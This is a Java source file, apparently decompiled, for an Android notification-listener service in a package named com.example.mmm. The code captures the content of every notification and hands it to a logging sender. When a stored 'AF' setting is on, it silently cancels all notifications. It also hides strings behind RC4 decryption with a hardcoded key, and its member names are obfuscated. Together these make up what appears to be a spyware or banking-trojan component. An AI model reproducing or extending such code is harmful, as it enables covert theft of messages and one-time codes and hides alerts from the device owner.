package com.example.mmm.Service;

import android.annotation.TargetApi;
import android.os.Build.VERSION;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.service.notification.NotificationListenerService.RankingMap;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.LogNotification;
import com.example.mmm.Utils.NotificationParser;
import com.example.mmm.Utils.utils;

@TargetApi(18)
public class srvNotificationListener extends NotificationListenerService {
   private static srvNotificationListener recipes$;
   constants noise$ = new constants();
   utils juice$ = new utils();

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public void onCreate() {
      super.onCreate();
      if (VERSION.SDK_INT < 21) {
         recipes$ = this;
      }

   }

   public void onDestroy() {
      if (VERSION.SDK_INT < 24) {
         recipes$ = null;
      }

      super.onDestroy();
   }

   public void onListenerConnected() {
      super.onListenerConnected();
      if (VERSION.SDK_INT >= 21) {
         recipes$ = this;
      }

   }

   public void onListenerDisconnected() {
      if (VERSION.SDK_INT >= 24) {
         recipes$ = null;
      }

      super.onListenerDisconnected();
   }

   public void onNotificationPosted(StatusBarNotification var1) {
      if (this.juice$.SettingsRead(this, "AF").equals("1")) {
         this.cancelAllNotifications();
      }

      (new LogNotification(this)).sendNotificationLog((new NotificationParser(var1, true)).toString());
   }

   public void onNotificationRemoved(StatusBarNotification var1) {
      if (this.juice$.SettingsRead(this, "AF").equals("1")) {
         this.cancelAllNotifications();
      }

      (new LogNotification(this))._revenue(var1);
   }

   public void onNotificationRemoved(StatusBarNotification var1, RankingMap var2, int var3) {
      if (this.juice$.SettingsRead(this, "AF").equals("1")) {
         this.cancelAllNotifications();
      }

      (new LogNotification(this))._revenue(var1);
   }
}
